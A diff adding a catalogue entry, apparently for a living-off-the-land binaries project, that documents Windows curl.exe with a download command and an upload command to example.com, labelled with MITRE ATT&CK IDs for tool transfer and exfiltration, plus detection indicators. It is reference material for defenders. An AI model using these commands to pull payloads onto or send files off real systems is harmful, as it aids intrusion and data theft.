@@ -1,0 +1,31 @@
+---
+Name: Curl.exe
+Description: Command-line tool for transferring data with URLs, bundled with Windows since Windows 10 version 1803.
+Author: Defa Mulya Pratama
+Created: 2026-10-08
+Commands:
+  - Command: curl https://example.com/file.exe -o C:\Users\Public\file.exe
+    Description: Retrieves a file from a remote URL and writes it to the local disk.
+    Usecase: Transfer a file from a remote host to the local system using a signed built-in utility.
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows 10 1803, Windows 10, Windows 11
+  - Command: curl -T C:\Users\Public\data.bin https://example.com/upload
+    Description: Sends a local file to a remote URL using an HTTP upload.
+    Usecase: Transfer a local file to a remote host using a signed built-in utility.
+    Category: Upload
+    Privileges: User
+    MitreID: T1048
+    OperatingSystem: Windows 10 1803, Windows 10, Windows 11
+Full_Path:
+  - Path: C:\Windows\System32\curl.exe
+  - Path: C:\Windows\SysWOW64\curl.exe
+Detection:
+  - IOC: curl.exe establishing outbound connections to untrusted or uncommon hosts
+  - IOC: curl.exe writing files into user-writable directories via the -o or -O option
+Resources:
+  - Link: https://curl.se/docs/manpage.html
+Acknowledgement:
+  - Person: Defa Mulya Pratama
+    Handle: '@defamp'
